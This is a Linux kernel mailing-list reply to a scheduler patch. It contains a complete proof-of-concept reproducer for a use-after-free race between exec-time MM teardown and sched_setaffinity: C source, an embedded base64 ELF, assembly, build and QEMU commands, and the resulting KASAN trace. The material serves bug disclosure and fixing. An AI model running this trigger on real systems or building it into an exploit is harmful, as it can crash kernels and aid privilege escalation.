Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.210.172
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794335927;
	b=QRshoYfoPAkkNu30BCIzVm9B5lLhP1ItlNEtYM5z7lZDDrHhZgwzH0/Qraw1ZEzouFPu
	 st7sFCY53psAuRRZ1cLp1lua9QZkwcJqOYMqUAW+RYa10f9f8zCPa01Og8nU/uHbMEXvb
	 rHTr2oKqRgRtX1Pkm3VF74uW6Ja5PVmBdXTxhfpPf40PVzaAK9lrklAOs4pbNJ5ZzsemS
	 ATn9QuQnQg7u2w0KHMvSjZkPpyB0mCiZNugZV9zPfS7Q57d1Yxsf0a5Nx9MLtoud0z8sc
	 qjrxJBuEh/VZxyNyjdGz6YVQaS4ZKFbBW7rV/vX+T520mG2a6Qn3XpP668XZzcBIsNA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794335927;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:In-Reply-To:References:
	 MIME-Version:Content-Transfer-Encoding;
	bh=KPARybczsQ4TwiwoQgAZSJyw5+1uXswc+09aq1THBoA=;
	b=W0mKkgw7AlU7o0/kF/zWzMtAICXmdoUKMFvgSrLCjUpjmLvVVAw286pCS9fj9SOsrLOQ
	 NAZGGwK4dmCUZG+T1MilgHOo1vV+816xkUSeImRbqgr0r/1qNFNIuAWj9bCP+F+BYAr1g
	 ahc/mp0f7XT0dvyV8cjpoye+s+tjYtJwwNKhFo93GceP9UQEZUOk4MQ+qs7VlewQSj8rq
	 E5ee2oEqgEvbxo9JfnrUjWvEYVxsDSMtE+J31sK1Rup6YXfw7SRTegNs7q3N6/7UQg1Y4
	 D2mLFUkBVcCMeW93hX0kiPEsopiDz5ZnS4b/7QDCDB10qxECh2uat3/ucelNpXzt9BQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=zTjwgB4M;
	arc=none smtp.remote-ip=209.85.210.172
Received: from mail-pf1-f172.google.com (mail-pf1-f172.google.com [209.85.210.172])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 91396606A326
	for <linux-kernel@vger.kernel.org>; Tue, 10 Nov 2026 18:38:46 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 91396606A326
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=zTjwgB4M
Received: by mail-pf1-f172.google.com with SMTP id d2e1a72fcca58-8a070755c8cso1206356b3a.0
        for <linux-kernel@vger.kernel.org>; Tue, 10 Nov 2026 10:38:46 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794335926; x=1794940726; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=KPARybczsQ4TwiwoQgAZSJyw5+1uXswc+09aq1THBoA=;
        b=zTjwgB4My3Gq1qXZrONEd7MccD3abPVlbEma4zqfYUgA6gZ5qQ0FFgXREACCzTvGRl
         gIHgRmCOEHNxYbTNFnCCkbWCQmhJuNnXNzTlRy3tQuftS1d494Qv2J4GWSaOvvgPKwcq
         PCGKFTUBRUCZIcEbN9z538Y/jDe8YYQuTaSSOueEleW6VEURG6csAAAtjrlc07PptuBe
         bBzwIqAMGnWmVUIytN1wIYXr27fIVRF9b5K935R5vLULD+I1mYoyEOao2Oqp4P5Zsx30
         2UqRkxVsvOqGl9VpR6vE7Nrhh1EF+dvyIEX8PEQKEw27Whld5BB8zgji7L4+Daga4+bO
         O3fg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794335926; x=1794940726;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=KPARybczsQ4TwiwoQgAZSJyw5+1uXswc+09aq1THBoA=;
        b=xiePghHepoYqHKHmy7kOwTfVxdZ+/+Cex0aLF63zF+jrMAGT4VkFcRA9xvETQrrQTr
         pxGzbIm6TOPwmFgvu/PtC/orJq9eXak3fHTevQ2BTtxphn0J2ylTYIGCEGj3DktIcGUF
         7Js2OeDobn8Ejzvej1TLLsKTfGLNBMaHfOjD1bqoSL02+AKiZnuveIJIJQQr+q+eYKPX
         KHc9uMOGa9CCq7LwuEWNotpHi7CdlUJUtzSgvWurQ9uvFooEsmPvX4m3HE1UiCcnoCRm
         ym5M5MMOvoXe0sdc0f1MAAq9jNXY5mYcTxH4dD77AppWOb9UAQORsRVGgSzsNdDjfCa9
         wZ6Q==
X-Forwarded-Encrypted: i=1; AL+hErElSKtUOYXi8LBgy7uTVA/PLG5m3SeOnpMmqmCvYGsrWsW3SnW5pf/ItaV5Uja1jThGVIcmzI3hODa7LnA=@vger.kernel.org
X-Gm-Message-State: APuU4Z/MoWTL65f89CI+1IShyJn0u8qLkaVei1/wC9IKFGbfzzRLrVEQ
	Ix0LP9QwpgqN0mjuk+m1q2o+/62Zu5TLaQMM9tiy0oZbJ+F0L5hdxuF7
X-Gm-Gg: AYBFou0rMyGJcnPWOFda+L5UM61HYhiHkfkfR8BLmrDeKZSTLgD1aIZok0u56/zkrkA
	+r5OQHP3XmyM2GzVkAML1iWlt4uvb+N530I68F5nqAvOoyYs8yn0HEU3KaKcEaK9bXEAeQFPMSR
	oVTB9EkDZsZGJyTc4efyam0iUtitFwhp+DtNydQPM3g30p2aGW1O3hm6rEkMOrRYpS6CjcD9rOK
	JAs2yQMJh3IB+A4W+IJPsHxpDdUaTD3H+JhgjoXjRMDwMhdWs9gZpgaSht0wxiP2U8PzzkXG6r4
	LjQuexukQgAWRmeWJOMdkZ7bZH0eB48BwLgmI7MuLcvkd9avZMFU0VnuzoPPw7X28kB9NR/pL6o
	/2aGm0CXGov3r8Qs9gPK4T5eKUkNNNXKqFGVBR3UhvTx3AdB5iLb2xU83yKsmX7zLvvvKcLAugj
	tgXu/F2ruw2l5OrapSuI01JQMhF9j9/aHp6ZmAh6BPiJG/AoL4xQKs83mMU3N1/O6S9RL+i1xhR
	vZu2d2V0N1/OTAuvq4ABbrNLBinCLGzNdYZsC3frGK7rLvUgomvngzrldnUDMf/dOL24vo3r5bF
	OcRWQ421Ii3+987HLW4pfeWEFIaVRcnT1sJOtSxn2xMnqcKFAwyUoe+5kA70wXzPCEQ03cXC2Tt
	f1A==
X-Received: by 2002:a05:6a00:950b:b0:8b5:c588:ca49 with SMTP id d2e1a72fcca58-8ba8764699fmr3637501b3a.46.1794335925819;
        Tue, 10 Nov 2026 10:38:45 -0800 (PST)
Received: from Terra.tail0ac356.ts.net ([198.176.50.208])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8baaa963bd1sm1257490b3a.29.2026.11.10.10.38.33
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 10 Nov 2026 10:38:45 -0800 (PST)
From: Weiming Shi <bestswngs@gmail.com>
To: Kees Cook <kees@kernel.org>,
	Alexander Viro <viro@zeniv.linux.org.uk>,
	Christian Brauner <brauner@kernel.org>,
	Jan Kara <jack@suse.cz>,
	Ingo Molnar <mingo@redhat.com>,
	Peter Zijlstra <peterz@infradead.org>,
	Juri Lelli <juri.lelli@redhat.com>,
	Vincent Guittot <vincent.guittot@linaro.org>,
	Dietmar Eggemann <dietmar.eggemann@arm.com>,
	Steven Rostedt <rostedt@goodmis.org>,
	Ben Segall <bsegall@google.com>,
	Mel Gorman <mgorman@suse.de>,
	Valentin Schneider <vschneid@redhat.com>,
	K Prateek Nayak <kprateek.nayak@amd.com>
Cc: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
	linux-mm@kvack.org,
	linux-fsdevel@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Xiang Mei <xmei5@asu.edu>
Subject: Re: [PATCH v3] sched/mmcid: Synchronize MM teardown with affinity updates
Date: Tue, 10 Nov 2026 10:38:09 -0800
Message-ID: <20261110183809.3308868-2-bestswngs@gmail.com>
X-Mailer: git-send-email 2.56.0
In-Reply-To: <20261110183809.3308868-1-bestswngs@gmail.com>
References: <20261110183809.3308868-1-bestswngs@gmail.com>
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi,

Here is a standalone reproducer for the p->mm lifetime race.

The tested kernel was commit 05441d697f7f9a927264f4058cbbc6a03dfcac9d
with:

```
CONFIG_SMP=y
CONFIG_EXPERT=y
# CONFIG_FUTEX is not set
CONFIG_RSEQ=y
CONFIG_SCHED_MM_CID=y
CONFIG_KASAN=y
CONFIG_KASAN_GENERIC=y
CONFIG_KASAN_INLINE=y
CONFIG_DEBUG_INFO=y
```

KASAN and DEBUG_INFO produce and decode the report. The vulnerable path
requires CONFIG_SCHED_MM_CID=y. This exec manifestation also requires
CONFIG_FUTEX=n because futex_exec_done() otherwise serializes old-MM teardown
with the p->pi_lock held by the affinity updater.

Dependencies and scheduling setup:

- x86-64 Linux guest with at least four online CPUs;
- gcc and glibc in the guest to build the PoC;
- sched_setaffinity(), memfd_create(), and execveat() available;
- eight guest vCPUs scheduled on four host CPUs for the tested 2:1 overcommit;
- UID/GID 65534 for the tested run.

Host command:

```
taskset -c 0-3 qemu-system-x86_64 \
    -accel kvm -machine q35 -cpu max -m 8G -smp 8 \
    -kernel bzImage -initrd initramfs.cpio.gz \
    -append "console=ttyS0 rdinit=/init nokaslr panic_on_warn=1 panic=-1" \
    -nographic -no-reboot
```

Build and run inside the guest:

```
gcc -O3 -Wall -Wextra -o poc poc.c
./poc 180
```

The reproducer works as follows:

1. It decodes an embedded 848-byte ET_EXEC image into a memfd.
2. The victim initially pins itself to the penultimate guest CPU. The setters
   then alternate its affinity between that CPU alone and the last two guest
   CPUs while it repeatedly executes the memfd with execveat(AT_EMPTY_PATH).
3. Up to six same-UID setter processes run on the other CPUs and alternate the
   victim between one- and two-CPU affinity masks.
4. A 31-us periodic userspace SIGALRM provides interrupt pressure.
5. Host CFS overcommit can deschedule a setter after it loads the
   victim's old p->mm. The victim can then complete setup_new_exec() and free
   that old mm before the setter reaches mm_update_cpus_allowed().

The PoC counts syscall attempts, successful affinity updates, errors, and
completed victim execs separately. Every ten-second window must contain both
a successful affinity update and victim exec progress. It checks for an early
victim or setter exit, and a clean result requires successful child statuses.

This is a stochastic race. The progress-checking version reported the UAF
after about 52.60 seconds. The last completed ten-second window before the
crash recorded 2,096,128 successful affinity updates, zero errors, and 18,975
completed execs:

```
BUG: KASAN: slab-use-after-free in set_cpus_allowed_common
Read of size 4 at addr ffff888123155e4c by task poc/5132
CPU: 4 UID: 65534 PID: 5132 Comm: poc

Call Trace:
 set_cpus_allowed_common             kernel/sched/core.c:10835
 set_cpus_allowed_fair               kernel/sched/fair.c:10046
 __set_cpus_allowed_ptr_locked       kernel/sched/core.c:3224
 __set_cpus_allowed_ptr              kernel/sched/core.c:3258
 __sched_setaffinity                 kernel/sched/syscalls.c:1161
 sched_setaffinity                   kernel/sched/syscalls.c:1239
 __x64_sys_sched_setaffinity         kernel/sched/syscalls.c:1275
 do_syscall_64                       arch/x86/entry/syscall_64.c:84
 entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121

Freed by task 5127:
 kmem_cache_free                     mm/slub.c:6757
 __mmput                             kernel/fork.c:1204
 mmput                               kernel/fork.c:1215
 setup_new_exec                      fs/exec.c:1395
 load_elf_binary                     fs/binfmt_elf.c:1024
 bprm_execve                         fs/exec.c:1865
 do_execveat_common.isra.0           fs/exec.c:1963
 __x64_sys_execveat                  fs/exec.c:2047
 do_syscall_64                       arch/x86/entry/syscall_64.c:84
 entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
```

Complete PoC:

```c
/*
 * Standalone reproducer for the sched/mmcid p->mm UAF.
 *
 * Build: gcc -O3 -o poc poc.c
 * Run:   taskset -c 0-3 qemu-system-x86_64 ... -smp 8 ...
 * Guest: ./poc [seconds]
 *
 * The tiny self-exec victim is embedded below and executed from memfd.  The
 * tested VM used CONFIG_SCHED_MM_CID=y, CONFIG_FUTEX=n and 2:1 vCPU
 * overcommit (8 vCPUs on 4 host CPUs).
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define DEFAULT_RUNTIME 180
#define MAX_SETTERS 6
#define READY_FD 3
#define VICTIM_FD 4
#define VICTIM_SIZE 848

/* 848-byte ET_EXEC produced from victim_min_execfd.S + victim_min.ld. */
static const char victim_b64[] =
"f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAsABAAAAAAABAAAAAAAAAABACAAAAAAAAAAAAAEAAOAAC"
"AEAABQAEAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAOAEAAAAAAAA4AQAAAAAAAAAQ"
"AAAAAAAAUeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAA"
"AAAAAABJieS4AQAAAL8DAAAASI01VAAAALoIAAAADwVIg/gIdTlMiedIgecAAOD/vgAAQAC4CwAA"
"AA8FuEIBAAC/BAAAAEiNNSgAAABIjRUpAAAARTHSQbgAEAAADwW4PAAAAL9/AAAADwX0kAEAAAAA"
"AAAAAAAAAAAAAAAgAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA"
"8f8AAAAAAAAAAAAAAAAAAAAACgAAAAAAAQAYAUAAAAAAAAAAAAAAAAAADgAAAAAAAQAgAUAAAAAA"
"AAAAAAAAAAAAFAAAAAAAAQAoAUAAAAAAAAAAAAAAAAAAGQAAABIAAQCwAEAAAAAAAGcAAAAAAAAA"
"AHZpY3RpbS5vAG9uZQBlbXB0eQBhcmd2AF9zdGFydAAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRh"
"YgAuaW1hZ2UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAABwAAAAAAAACwAEAAAAAAALAAAAAAAAAAiAAA"
"AAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAA4AQAA"
"AAAAAJAAAAAAAAAAAwAAAAUAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAA"
"AAAAyAEAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAA"
"AAAAAAAAAAAAAOgBAAAAAAAAIgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=";

struct setter_stats {
	volatile unsigned long long attempts;
	volatile unsigned long long successes;
	volatile unsigned long long errors;
};

struct shared_state {
	struct setter_stats setters[MAX_SETTERS];
};

static int b64_value(unsigned char c)
{
	if (c >= 'A' && c <= 'Z')
		return c - 'A';
	if (c >= 'a' && c <= 'z')
		return c - 'a' + 26;
	if (c >= '0' && c <= '9')
		return c - '0' + 52;
	if (c == '+')
		return 62;
	if (c == '/')
		return 63;
	return -1;
}

static int install_victim(void)
{
	unsigned char out[VICTIM_SIZE];
	size_t i, n = 0;
	unsigned int acc = 0, bits = 0;
	int fd;

	for (i = 0; victim_b64[i] && victim_b64[i] != '='; i++) {
		int v = b64_value((unsigned char)victim_b64[i]);

		if (v < 0)
			continue;
		acc = (acc << 6) | (unsigned int)v;
		bits += 6;
		if (bits >= 8) {
			bits -= 8;
			if (n == sizeof(out)) {
				errno = EOVERFLOW;
				return -1;
			}
			out[n++] = (unsigned char)(acc >> bits);
			acc &= (1U << bits) - 1;
		}
	}
	if (n != sizeof(out)) {
		errno = EINVAL;
		return -1;
	}
	fd = syscall(SYS_memfd_create, "sched-mmcid-victim", 0);
	if (fd < 0)
		return -1;
	if (fd != VICTIM_FD) {
		if (dup2(fd, VICTIM_FD) < 0) {
			close(fd);
			return -1;
		}
		close(fd);
		fd = VICTIM_FD;
	}
	if (write(fd, out, n) != (ssize_t)n || fchmod(fd, 0700))
		return -1;
	return 0;
}

static int install_exec_counter(void)
{
	int fd = eventfd(0, EFD_NONBLOCK);

	if (fd < 0)
		return -1;
	if (fd != READY_FD) {
		if (dup2(fd, READY_FD) < 0) {
			close(fd);
			return -1;
		}
		close(fd);
	}
	return 0;
}

static void pin_self(int cpu)
{
	cpu_set_t mask;

	CPU_ZERO(&mask);
	CPU_SET(cpu, &mask);
	if (sched_setaffinity(0, sizeof(mask), &mask)) {
		fprintf(stderr, "pin cpu%d: %s\n", cpu, strerror(errno));
		_exit(2);
	}
}

static void alarm_handler(int sig)
{
	(void)sig;
}

static void enable_irq_pressure(void)
{
	struct sigaction sa = { .sa_handler = alarm_handler };
	struct itimerval timer = {
		.it_interval = { .tv_sec = 0, .tv_usec = 31 },
		.it_value = { .tv_sec = 0, .tv_usec = 31 },
	};

	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART;
	if (sigaction(SIGALRM, &sa, NULL) ||
	    setitimer(ITIMER_REAL, &timer, NULL))
		_exit(3);
}

static int drain_exec_counter(unsigned long long *total)
{
	uint64_t value;

	for (;;) {
		ssize_t ret = read(READY_FD, &value, sizeof(value));

		if (ret == sizeof(value)) {
			*total += value;
			continue;
		}
		if (ret < 0 && errno == EINTR)
			continue;
		if (ret < 0 && errno == EAGAIN)
			return 0;
		return -1;
	}
}

static int wait_for_first_exec(pid_t victim, unsigned long long *execs)
{
	struct pollfd pfd = { .fd = READY_FD, .events = POLLIN };
	int status, ret;

	do {
		ret = poll(&pfd, 1, 5000);
	} while (ret < 0 && errno == EINTR);
	if (ret != 1 || !(pfd.revents & POLLIN) ||
	    drain_exec_counter(execs) || !*execs)
		return -1;
	ret = waitpid(victim, &status, WNOHANG);
	if (ret == victim) {
		errno = ECHILD;
		return -1;
	}
	return ret < 0 ? -1 : 0;
}

static void publish_stats(struct setter_stats *stats,
			  unsigned long long attempts,
			  unsigned long long successes,
			  unsigned long long errors)
{
	__atomic_store_n(&stats->attempts, attempts, __ATOMIC_RELAXED);
	__atomic_store_n(&stats->successes, successes, __ATOMIC_RELAXED);
	__atomic_store_n(&stats->errors, errors, __ATOMIC_RELAXED);
}

static void run_setter(pid_t victim, int cpu, int victim_a, int victim_b,
		       int index, time_t deadline, struct shared_state *state)
{
	cpu_set_t one, two;
	unsigned long long attempts = 0, successes = 0, errors = 0;

	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	pin_self(cpu);
	enable_irq_pressure();
	CPU_ZERO(&one);
	CPU_SET(victim_a, &one);
	CPU_ZERO(&two);
	CPU_SET(victim_a, &two);
	CPU_SET(victim_b, &two);
	while (time(NULL) < deadline) {
		if (!syscall(SYS_sched_setaffinity, victim, sizeof(one), &one))
			successes++;
		else
			errors++;
		attempts++;
		if (!syscall(SYS_sched_setaffinity, victim, sizeof(two), &two))
			successes++;
		else
			errors++;
		attempts++;
		if (!(attempts & 0x3ff))
			publish_stats(&state->setters[index], attempts,
				      successes, errors);
	}
	publish_stats(&state->setters[index], attempts, successes, errors);
	_exit(0);
}

static void load_totals(struct shared_state *state, int nset,
			unsigned long long *attempts,
			unsigned long long *successes,
			unsigned long long *errors)
{
	int i;

	*attempts = *successes = *errors = 0;
	for (i = 0; i < nset; i++) {
		*attempts += __atomic_load_n(&state->setters[i].attempts,
					     __ATOMIC_RELAXED);
		*successes += __atomic_load_n(&state->setters[i].successes,
					      __ATOMIC_RELAXED);
		*errors += __atomic_load_n(&state->setters[i].errors,
					   __ATOMIC_RELAXED);
	}
}

static int wait_child(pid_t pid, int *status)
{
	pid_t ret;

	do {
		ret = waitpid(pid, status, 0);
	} while (ret < 0 && errno == EINTR);
	return ret == pid ? 0 : -1;
}

int main(int argc, char **argv)
{
	struct shared_state *state;
	pid_t victim, setters[MAX_SETTERS];
	time_t deadline;
	unsigned long long attempts = 0, successes = 0, errors = 0;
	unsigned long long execs = 0, previous_execs, previous_successes = 0;
	int cpus, runtime, victim_a, victim_b, nset, i, status;
	int spawned = 0, failed = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (cpus < 4) {
		fprintf(stderr, "need at least four online CPUs\n");
		return 1;
	}
	runtime = argc > 1 ? atoi(argv[1]) : DEFAULT_RUNTIME;
	if (runtime <= 0)
		runtime = DEFAULT_RUNTIME;
	victim_a = cpus - 2;
	victim_b = cpus - 1;
	nset = victim_a < MAX_SETTERS ? victim_a : MAX_SETTERS;
	state = mmap(NULL, sizeof(*state), PROT_READ | PROT_WRITE,
		     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (state == MAP_FAILED)
		return 1;
	for (i = 0; i < MAX_SETTERS; i++)
		setters[i] = -1;
	if (install_exec_counter() || install_victim()) {
		perror("install victim");
		return 1;
	}

	victim = fork();
	if (!victim) {
		cpu_set_t pinned;
		char *const av[] = { "victim", NULL };
		char *const ev[] = { NULL };

		prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
		CPU_ZERO(&pinned);
		CPU_SET(victim_a, &pinned);
		if (sched_setaffinity(0, sizeof(pinned), &pinned))
			_exit(4);
		syscall(SYS_execveat, VICTIM_FD, "", av, ev, AT_EMPTY_PATH);
		_exit(127);
	}
	if (victim < 0)
		return 1;
	if (wait_for_first_exec(victim, &execs)) {
		perror("victim did not begin exec loop");
		failed = 1;
		goto cleanup;
	}
	deadline = time(NULL) + runtime;
	printf("[*] standalone minimal-exec race: runtime=%ds setters=%d\n",
	       runtime, nset);
	printf("[*] victim starts on cpu%d; setters alternate {%d} and {%d,%d}\n",
	       victim_a, victim_a, victim_a, victim_b);
	for (i = 0; i < nset; i++) {
		setters[i] = fork();
		if (!setters[i])
			run_setter(victim, i, victim_a, victim_b, i,
				   deadline, state);
		if (setters[i] < 0) {
			perror("fork setter");
			failed = 1;
			goto cleanup;
		}
		spawned++;
	}
	previous_execs = execs;
	while (time(NULL) < deadline) {
		struct timespec delay;
		time_t remaining = deadline - time(NULL);
		pid_t ret;

		ret = waitpid(victim, &status, WNOHANG);
		if (ret == victim) {
			fprintf(stderr, "victim exited early: status=0x%x\n", status);
			victim = -1;
			failed = 1;
			goto cleanup;
		}
		if (ret < 0) {
			perror("waitpid victim");
			failed = 1;
			goto cleanup;
		}
		for (i = 0; i < spawned; i++) {
			if (setters[i] < 0)
				continue;
			ret = waitpid(setters[i], &status, WNOHANG);
			if (ret == setters[i]) {
				setters[i] = -1;
				if (time(NULL) < deadline || !WIFEXITED(status) ||
				    WEXITSTATUS(status)) {
					fprintf(stderr,
						"setter %d exited early: status=0x%x\n",
						i, status);
					failed = 1;
					goto cleanup;
				}
			} else if (ret < 0) {
				perror("waitpid setter");
				failed = 1;
				goto cleanup;
			}
		}
		if (remaining <= 0)
			break;
		delay.tv_sec = remaining > 10 ? 10 : remaining;
		delay.tv_nsec = 0;
		while (nanosleep(&delay, &delay) && errno == EINTR)
			;
		if (drain_exec_counter(&execs)) {
			perror("read exec counter");
			failed = 1;
			goto cleanup;
		}
		ret = waitpid(victim, &status, WNOHANG);
		if (ret == victim) {
			fprintf(stderr, "victim exited early: status=0x%x\n", status);
			victim = -1;
			failed = 1;
			goto cleanup;
		}
		if (ret < 0) {
			perror("waitpid victim");
			failed = 1;
			goto cleanup;
		}
		load_totals(state, nset, &attempts, &successes, &errors);
		if (execs == previous_execs) {
			fprintf(stderr, "victim made no exec progress in window\n");
			failed = 1;
			goto cleanup;
		}
		if (successes == previous_successes) {
			fprintf(stderr,
				"setters made no successful affinity progress in window\n");
			failed = 1;
			goto cleanup;
		}
		printf("[*] progress: affinity_success=%llu attempts=%llu "
		       "errors=%llu execs=%llu\n",
		       successes, attempts, errors, execs);
		previous_execs = execs;
		previous_successes = successes;
	}
	for (i = 0; i < spawned; i++) {
		if (setters[i] < 0)
			continue;
		if (wait_child(setters[i], &status) || !WIFEXITED(status) ||
		    WEXITSTATUS(status)) {
			fprintf(stderr, "setter %d failed: status=0x%x\n", i, status);
			failed = 1;
		}
		setters[i] = -1;
	}
	load_totals(state, nset, &attempts, &successes, &errors);
	if (!attempts || !successes || attempts != successes + errors) {
		fprintf(stderr, "invalid affinity totals\n");
		failed = 1;
	}
	if (drain_exec_counter(&execs)) {
		fprintf(stderr, "failed to read final exec progress\n");
		failed = 1;
	}
	if (kill(victim, SIGKILL)) {
		perror("kill victim");
		failed = 1;
	} else if (wait_child(victim, &status) || !WIFSIGNALED(status) ||
		   WTERMSIG(status) != SIGKILL) {
		fprintf(stderr, "unexpected victim status: 0x%x\n", status);
		failed = 1;
	}
	victim = -1;
	if (!failed) {
		printf("[*] validated completion: affinity_success=%llu "
		       "attempts=%llu errors=%llu execs=%llu; no KASAN report\n",
		       successes, attempts, errors, execs);
		return 0;
	}

cleanup:
	for (i = 0; i < spawned; i++) {
		if (setters[i] > 0) {
			kill(setters[i], SIGKILL);
			wait_child(setters[i], &status);
		}
	}
	if (victim > 0) {
		kill(victim, SIGKILL);
		wait_child(victim, &status);
	}
	puts("[!] validation failed");
	return 1;
}
```

The embedded victim source and linker script follow.

`victim_min_execfd.S`:

```asm
	.section .text
	.global _start
	.type _start,@function
_start:
	mov %rsp, %r12

	/* Count this instance through the inherited eventfd. */
	mov $1, %eax
	mov $3, %edi
	lea one(%rip), %rsi
	mov $8, %edx
	syscall
	cmp $8, %rax
	jne .Lexit

	/* Drop the stack and adjacent vDSO/vvar mappings before exec. */
	mov %r12, %rdi
	and $-2097152, %rdi
	mov $4194304, %esi
	mov $11, %eax
	syscall

	/* execveat(inherited_memfd_4, "", argv, NULL, AT_EMPTY_PATH). */
	mov $322, %eax
	mov $4, %edi
	lea empty(%rip), %rsi
	lea argv(%rip), %rdx
	xor %r10d, %r10d
	mov $0x1000, %r8d
	syscall

.Lexit:
	mov $60, %eax
	mov $127, %edi
	syscall
	hlt
	.size _start, .-_start

	.section .data
	.align 8
one:
	.quad 1
empty:
	.byte 0
	.align 8
argv:
	.quad empty
	.quad 0

	.section .note.GNU-stack,"",@progbits
```

`victim_min.ld`:

```ld
ENTRY(_start)

PHDRS
{
	image PT_LOAD FILEHDR PHDRS FLAGS(7);
	stack PT_GNU_STACK FLAGS(6);
}

SECTIONS
{
	. = 0x400000 + SIZEOF_HEADERS;
	.image : ALIGN(16) {
		*(.text*)
		*(.rodata*)
		*(.data*)
		*(.bss*)
	} :image
	/DISCARD/ : { *(.note*) *(.comment*) *(.eh_frame*) }
}
```

The embedded image was built with GCC 16.2.1 and GNU ld 2.46.1:

```sh
gcc -c -nostdlib -o victim.o victim_min_execfd.S
ld -nostdlib -T victim_min.ld -o victim victim.o
test "$(stat -c %s victim)" = 848
readelf -h -l -S victim
base64 -w 76 victim
```


Thanks,
Weiming

